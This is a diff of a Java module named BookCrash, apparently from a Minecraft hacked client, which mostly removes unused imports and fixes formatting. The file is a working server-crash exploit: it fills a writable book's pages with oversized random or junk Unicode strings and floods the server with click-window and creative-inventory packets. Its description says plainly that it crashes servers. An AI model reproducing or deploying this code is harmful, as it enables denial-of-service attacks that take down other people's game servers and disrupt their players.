@@ -1,8 +1,6 @@
 package me.zeroeightsix.kami.module.modules.misc;
 
-import com.google.common.eventbus.Subscribe;
 import me.zeroeightsix.kami.command.Command;
-import me.zeroeightsix.kami.event.events.PacketEvent;
 import me.zeroeightsix.kami.module.Module;
 import me.zeroeightsix.kami.setting.Setting;
 import me.zeroeightsix.kami.setting.Settings;
@@ -13,21 +11,19 @@ import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.nbt.NBTTagString;
-import net.minecraft.network.login.server.SPacketLoginSuccess;
 import net.minecraft.network.play.client.CPacketClickWindow;
 import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
-import net.minecraft.network.play.server.SPacketDisconnect;
-import net.minecraft.network.play.server.SPacketJoinGame;
 
 import java.util.Random;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
+
 /**
  * Created by d1gress/Qther on 24/11/2019.	 * Created by d1gress/Qther on 25/11/2019.
  * Updated by d1gress/Qther on 26/11/2019.
  */
 @Module.Info(name = "BookCrash", category = Module.Category.MISC, description = "Crashes servers by sending large packets")
-public class BookCrash extends Module{
+public class BookCrash extends Module {
 
     private int currDelay;
     private Setting<Mode> mode = register(Settings.e("Mode", Mode.RAION));
@@ -39,13 +35,13 @@ public class BookCrash extends Module{
 
     @Override
     public void onUpdate() {
-        if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty())  {
+        if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
             Command.sendChatMessage("Not connected to a server");
             this.disable();
         }
 
         currDelay = (currDelay >= delay.getValue() ? 0 : delay.getValue() + 1);
-        if(currDelay > 0) return;
+        if (currDelay > 0) return;
 
         ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
         NBTTagList list = new NBTTagList();
@@ -59,13 +55,13 @@ public class BookCrash extends Module{
 
         if (fillMode.getValue().equals(FillMode.RANDOM)) {
             IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
-            size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-        }else if (fillMode.getValue().equals(FillMode.FFFF)) {
+            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
+        } else if (fillMode.getValue().equals(FillMode.FFFF)) {
             size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
-        }else if (fillMode.getValue().equals(FillMode.ASCII)) {
+        } else if (fillMode.getValue().equals(FillMode.ASCII)) {
             IntStream chars = new Random().ints(0x20, 0x7E);
-            size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-        }else if (fillMode.getValue().equals(FillMode.OLD)) {
+            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
+        } else if (fillMode.getValue().equals(FillMode.OLD)) {
             size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
         }
 
@@ -82,9 +78,9 @@ public class BookCrash extends Module{
         bookObj.setTagInfo("pages", list);
         bookObj.setTagCompound(tag);
 
-        for(int i = 0; i < uses.getValue(); i++) {
+        for (int i = 0; i < uses.getValue(); i++) {
             mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
-            if(mode.getValue() == Mode.JESSICA) {
+            if (mode.getValue() == Mode.JESSICA) {
                 mc.playerController.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
             }
         }
